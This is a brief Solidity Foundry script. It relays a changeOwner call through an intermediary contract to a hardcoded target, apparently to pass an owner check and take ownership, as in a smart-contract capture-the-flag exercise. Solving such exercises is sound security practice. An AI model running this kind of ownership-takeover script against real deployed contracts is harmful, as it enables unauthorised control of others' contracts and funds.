// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface YourDate
{
    function changeOwner(address _x) external;
}

contract YourLove
{
    function changeOwner(address _x)
        public
    {
        address _instance = 0x4b122E53ecF21cDd447EEE93AEb2CE4AA49970Cc;
        YourDate(_instance).changeOwner(_x);
    }
}

contract StarryNight is Script
{
    function run()
        public
    {
        vm.startBroadcast();
        // YourLove _love = new YourLove();
        YourLove _love = YourLove(0x285D8cd6510C2B244088450716be4d5ab805aDD8);
        _love.changeOwner(0x098a3198Dd3eB641171445B5eFE3e04860Ee3CA8);
        vm.stopBroadcast();
    }
}
